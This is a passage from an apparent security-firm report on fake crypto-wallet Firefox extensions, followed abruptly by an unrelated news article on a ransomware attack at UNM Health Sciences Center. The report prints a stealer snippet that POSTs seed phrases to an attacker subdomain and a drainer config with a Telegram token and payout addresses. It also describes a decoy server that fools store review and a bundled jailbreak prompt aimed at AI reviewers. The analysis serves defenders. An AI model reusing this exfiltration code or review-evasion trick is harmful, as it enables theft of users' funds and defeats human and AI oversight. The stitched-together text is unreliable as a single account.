The Jupiter and Bitget impersonators do not use a remote loader. Their stealers are bundled in the package and post the captured mnemonic straight to the brand subdomain. The Jupiter impersonator sends the phrase on its “standalone” and “mnemonic” code paths.

case"standalone":case"mnemonic":{fetch("https://jupiter.bonto.io",{method:'POST',headers:{"Content-Type":"application/json"}

The Jupiter impersonator also declares host access to Trezor Connect at connect.trezor.io, which widens the surface it can read. The Bitget impersonator references bitget[.]bonto[.]io in its static/js/hook.js and follows the same bundled pattern.

The Stealer Also Ships In-Package, and Phantom Bundles the Operator's Backend

All three packages ship a complete, always-on stealer inside the signed code Mozilla reviewed, each rated 10 out of 10 by Socket's scanner. Phantom's is analytics.js, wired into its own popup and onboarding pages. Jupiter ships two: a 621 kB trojanized background.js that sends the mnemonic and private key to jupiter[.]bonto[.]io on wallet import, and a smaller hook.js that captures seed phrases and keys from page inputs and the clipboard on any page. Bitget also ships two: static/js/hook.js, which scans page content and extension messages, and static/js/bg-init.js, a background worker that hooks the wallet's own storage to lift the seed as it is decrypted and overrides tab creation to funnel the victim into the local import screen. Both route to bitget[.]bonto[.]io. The remote loader described earlier is Phantom-only, and it gates and refreshes a payload that already ships in the package rather than being the only copy.

Phantom also bundles the operator's own drainer backend as server.js, a Node.js server inside the signed add-on. It logs captured secrets to local files, forwards them to a Telegram bot, and automatically sweeps funds to hardcoded payout addresses across Ethereum, BSC, Polygon, Arbitrum, Optimism, Base, Avalanche, Solana, and Bitcoin. A comment in the file notes the payload reaches the extension only "after approval flip," meaning after Mozilla's review.

The package also ships server-review.js, a stripped server that returns an inactive config during Mozilla's review. After approval the operator switches to the live server.js, the "approval flip" the comment refers to.

const TG_TOKEN = '8834114695:AAGC99--r8KFikBpDw5JCkAteIc4cRi2VTU'; const TG_CHAT = '-5433023573'; const DEST = { evm: '0x93ce11fAA9FC83741e8b392879b383bcc5f7f3Ad', sol: 'GCo8tAh5WjAuH51bnRZtkmKDRuoXHFDNz9MZY25Zuvsr', btc: 'bc1qrsfyjrsel924nny9q0qak5cfyf7pahmsydwnrq', };

Infrastructure and Attribution #

All exfiltration points to subdomains of a single apex, bonto[.]io, fronted by Cloudflare so the origin is hidden. The Phantom host behaves as a second-stage delivery and exfiltration point, while the other brand hosts accept exfiltration POSTs directly. Probing the apex for additional brand subdomains returned provisioned hosts for coinbase[.]bonto[.]io and exodus[.]bonto[.]io, each responding with the same signature as the confirmed Jupiter and Bitget exfiltration hosts, which indicates the campaign also targets the Coinbase Wallet and Exodus brands. Corresponding AMO listings for those two brands were not located at the time of writing.

Each of the three confirmed listings was published from a separate throwaway AMO developer account (anonymous-30b17a249a34fdf5d2be64b3dfcc8494, anonymous-3efb89873d4c425c012cd1cb1736629a, and anonymous-ca2bf8b1ba371a1426c1049d9dad8168), a pattern that spreads the campaign across accounts and slows bulk takedown.

The Phantom and Jupiter packages also ship a CLAUDE.md file the extension never loads at runtime. It is an AI-assistant jailbreak prompt, which points to AI-assisted malware authoring and an attempt to subvert AI-assisted review.

Impact #

When a victim installs one of these extensions and enters or reveals a recovery phrase, or pastes a private key, the secret is sent to the threat actor. A recovery phrase and a private key are bearer secrets: whoever holds them controls the wallet and can move every asset in it. The main-world injection means the Phantom variant can read secrets both when they are typed during import and when they are shown on a reveal-secret-phrase screen, and it can observe the page’s wallet provider directly.

The Phantom listing shows active rating manipulation. Over roughly two days the review count rose from 275 to 546 and the average rating rose from 2.9 to 3.9, which pushes down the one-star reviews in which users report losing funds. Reported losses in those reviews are self-reported and unverified. Average daily users reported by AMO for each listing were low, between one and three, but the listings were live and the infrastructure was active.

Socket’s AI Scanner flagging the Phantom impersonator as known malware.

Recommendations #

For Users

Install wallet extensions only from the vendor’s official website link, not from store search results. Homoglyph names and copied icons make a fake listing look identical to the real one.

Treat any extension that asks for a recovery phrase or private key outside the real wallet flow as hostile, and never enter a seed phrase into a page you reached from a store listing.

If you entered a seed phrase or private key into one of these extensions, move funds to a new wallet created on a clean device immediately and treat the old wallet as compromised.

For Developers

Pin the exact extension IDs your team uses and review extensions that request access to data for all websites together with tabs or scripting.

Watch for extensions that fetch and execute code at runtime, which is visible as a fetch of a configuration endpoint followed by eval or scripting.executeScript.

For Security Teams

Block the bonto[.]io apex and its subdomains at the network layer and alert on DNS lookups for brand-named subdomains under it.

Hunt for browser extensions whose signed bundle contains a loader that injects into the main world.

Socket’s browser extension protection analyzes extension bundles for hidden data flows, undisclosed credential exfiltration, and C2 backdoors, blocking malicious extensions before they reach user endpoints.

Full Text:
The University of New Mexico Health Sciences Center (UNM HSC) has been hit by a cyber incident, which resulted in the cancellation of surgeries and diversion of ambulances.

The medical center disclosed the incident on Monday October 26 at 2.30pm MDT, informing patients that all appointments, including scheduled surgeries, were cancelled for the rest of the day.

“UNM Health patients should not show up to UNM Health facilities on October 26. Emergencies should be handled by 911 and non-emergencies should be delayed until further notice,” the update read.

Clinical Services Resume but Classes Cancelled

A further update posted at 10.27pm on October 26 confirmed that all UNM Health hospitals had reopened, and clinics would resume regularly scheduled appointments and procedures from Tuesday, October 27.

“At 2:30pm, UNM Health began resuming operations and bringing systems back online in phases, as it was safe to do so. We will work with patients to reschedule missed appointments and procedures,” HSC added.

Read now: UK Healthcare Sector Records Tenfold Increase in Cyber-Attacks

All students enrolled at the School of Medicine, College of Pharmacy, College of Nursing, and College of Population Health were told to leave campus on Monday.

As part of its remediation efforts, UNM canceled classes on the Health Sciences campus and sent non-essential employees home.

All classes at the UNM School of Medicine, College of Nursing, College of Pharmacy and College of Population Health were also canceled on Tuesday, October 27, including online and remote classes, while non-essential employees will remain at home.

However, classes at UNM’s Central and branch campuses are not affected.

BYOD Ransomware Claims Attack

No details on the nature of the incident, or potential perpetrators, have been provided at the time of writing.

However, the emerging ransomware group BYOD has reportedly claimed to be behind the incident affecting UNM HSC.

Cybersecurity intelligence firm VenariX revealed on X that the group listed the University of New Mexico on its data leak site, claiming to have compromised 36,000 machines and exfiltrated sensitive data.

This data allegedly includes student and employee personally identifiable information (PII), research data, student records and internal emails.

“This is your entire network and infrastructure compromised, the entire university COMPLETELY,” the group posted on its data leak site.

UNM HSC receives more than one million patient visits every year, made up of around 900,000 outpatient appointments and around 100,000 emergency room visits.

The Center had 2670 students enrolled in its classes in 2025.
